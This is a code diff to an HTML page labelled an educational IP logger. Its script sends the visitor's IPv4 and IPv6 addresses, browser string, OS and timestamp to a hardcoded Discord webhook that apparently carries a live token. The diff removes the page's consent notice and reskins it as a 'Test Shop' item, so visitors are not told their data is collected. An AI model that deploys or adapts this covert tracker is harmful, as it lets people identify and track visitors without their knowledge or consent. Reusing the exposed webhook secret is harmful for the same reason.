@@ -3,25 +3,69 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>IP Logger Test (Educational)</title>
+<title>Test Shop - IP Logger (Educational)</title>
+<style>
+    body {
+        background-color: #0d1b2a;
+        font-family: Arial, sans-serif;
+        color: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    .card {
+        background-color: #1b263b;
+        padding: 20px;
+        border-radius: 12px;
+        box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.4);
+        width: 300px;
+        text-align: center;
+    }
+    h2 {
+        margin-bottom: 10px;
+        color: #e0e1dd;
+    }
+    button {
+        background-color: #415a77;
+        color: white;
+        padding: 10px 15px;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 16px;
+        transition: background-color 0.2s ease;
+    }
+    button:hover {
+        background-color: #778da9;
+    }
+</style>
 </head>
 <body>
-<h1>IP Logger Test Page</h1>
-<p>Click the button to send your IP (IPv4 & IPv6), browser, OS, and timestamp. Only consenting users should click!</p>
 
-<button onclick="sendIP()">Send IP</button>
+<div class="card">
+    <h2>Test Item</h2>
+    <p>Educational IPv4 & IPv6 Logger</p>
+    <button onclick="sendIP()">Send IPv4 & IPv6</button>
+</div>
 
 <script>
 async function sendIP() {
     const webhook = "https://discord.com/api/webhooks/1405178051607793797/lrLovFGo3LWPXBe3u874pQYct3xulb679aybaGQtdDYsnyrBeEZCXT5I2zs39z2-RqAR"; // Replace with your webhook
 
     try {
-        // Fetch IPv4 and IPv6 using ipify API
+        // Fetch IPv4
         const ipv4Res = await fetch('https://api.ipify.org?format=json');
         const ipv4 = (await ipv4Res.json()).ip;
 
-        const ipv6Res = await fetch('https://api64.ipify.org?format=json');
-        const ipv6 = (await ipv6Res.json()).ip;
+        // Fetch IPv6 (try/catch in case unavailable)
+        let ipv6 = "No IPv6 detected";
+        try {
+            const ipv6Res = await fetch('https://api64.ipify.org?format=json');
+            ipv6 = (await ipv6Res.json()).ip;
+        } catch (err) {
+            console.warn("IPv6 not available");
+        }
 
         // Browser and OS info
         const browser = navigator.userAgent;
@@ -32,7 +76,7 @@ async function sendIP() {
 
         // Prepare payload
         const payload = {
-            content: `**Educational Test Logging**\nIPv4: \`${ipv4}\`\nIPv6: \`${ipv6}\`\nBrowser: \`${browser}\`\nOS: \`${os}\`\nTime: \`${timestamp}\``
+            content: `**Test IP Logger (Educational)**\nIPv4: \`${ipv4}\`\nIPv6: \`${ipv6}\`\nBrowser: \`${browser}\`\nOS: \`${os}\`\nTime: \`${timestamp}\``
         };
 
         // Send to Discord webhook
@@ -51,5 +95,6 @@ async function sendIP() {
     }
 }
 </script>
+
 </body>
 </html>
